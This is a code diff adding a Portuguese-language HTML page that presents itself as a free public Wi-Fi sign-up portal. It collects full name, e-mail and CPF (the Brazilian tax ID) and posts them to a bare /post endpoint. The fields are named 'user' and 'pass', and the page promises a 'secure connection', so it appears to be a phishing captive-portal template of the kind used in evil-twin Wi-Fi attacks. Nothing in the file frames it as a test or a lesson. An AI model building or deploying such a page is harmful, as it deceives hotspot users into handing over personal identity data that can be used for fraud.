@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Grátis - Cadastro</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: #fff;
+            border-radius: 16px;
+            padding: 40px 32px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .icon {
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 64px;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+
+        p {
+            color: #666;
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            color: #333;
+            font-weight: 500;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #E0E0E0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.2);
+        }
+
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #fff;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+
+        button:hover {
+            transform: translateY(-2px);
+        }
+
+        .terms {
+            margin-top: 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .terms input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-top: 2px;
+        }
+
+        .terms label {
+            font-size: 12px;
+            color: #666;
+            font-weight: 400;
+            margin: 0;
+        }
+
+        .features {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 24px;
+            padding-top: 24px;
+            border-top: 1px solid #E0E0E0;
+        }
+
+        .feature {
+            text-align: center;
+        }
+
+        .feature span {
+            font-size: 24px;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .feature p {
+            font-size: 11px;
+            color: #999;
+            margin: 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="icon">📶</div>
+        <h1>WiFi Grátis</h1>
+        <p>Conecte-se à nossa rede WiFi gratuita! Basta preencher os dados abaixo para liberar o acesso.</p>
+        <form action="/post" method="post">
+            <div class="form-group">
+                <label>Nome completo</label>
+                <input type="text" name="name" placeholder="Seu nome" required>
+            </div>
+            <div class="form-group">
+                <label>E-mail</label>
+                <input type="email" name="user" placeholder="seu@email.com" required>
+            </div>
+            <div class="form-group">
+                <label>CPF</label>
+                <input type="text" name="pass" placeholder="000.000.000-00" required>
+            </div>
+            <div class="terms">
+                <input type="checkbox" id="terms" required>
+                <label for="terms">Aceito os termos de uso e política de privacidade da rede WiFi</label>
+            </div>
+            <button type="submit">Conectar à Internet</button>
+        </form>
+        <div class="features">
+            <div class="feature"><span>🚀</span>
+                <p>Alta<br>Velocidade</p>
+            </div>
+            <div class="feature"><span>🔒</span>
+                <p>Conexão<br>Segura</p>
+            </div>
+            <div class="feature"><span>♾️</span>
+                <p>Uso<br>Ilimitado</p>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
